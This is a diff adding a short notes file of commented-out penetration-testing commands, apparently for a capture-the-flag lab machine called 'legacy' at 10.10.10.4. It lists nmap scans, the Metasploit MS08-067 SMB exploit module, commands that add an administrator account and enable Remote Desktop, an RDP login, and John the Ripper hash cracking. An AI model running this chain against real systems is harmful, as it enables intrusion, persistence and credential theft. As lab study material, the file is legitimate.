@@ -1,0 +1,11 @@
+#nmap -T4 -A -v -oA nmap/legacy-10.10.10.4-2 10.10.10.4 -PN
+#nmap -sC -sV -oA nmap/legacy-10.10.10.4 10.10.10.4 -PN
+#windows/smb/ms08_067_netapi
+#net user /add [username] [password]
+#net localgroup administrators [username] /add
+#run getgui -u loneferret -p password
+#reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+#rdesktop -u ksanchez-rdp -p 123@4 10.10.10.4
+#john --wordlist=password.lst hashesdump.txt
+#john --format=NT --rules -w=/usr/share/wordlists/rockyou.txt hashfile.txt
+#john --format:descrypt --wordlist=crackstation-human-only.txt --rules hashdump.txt
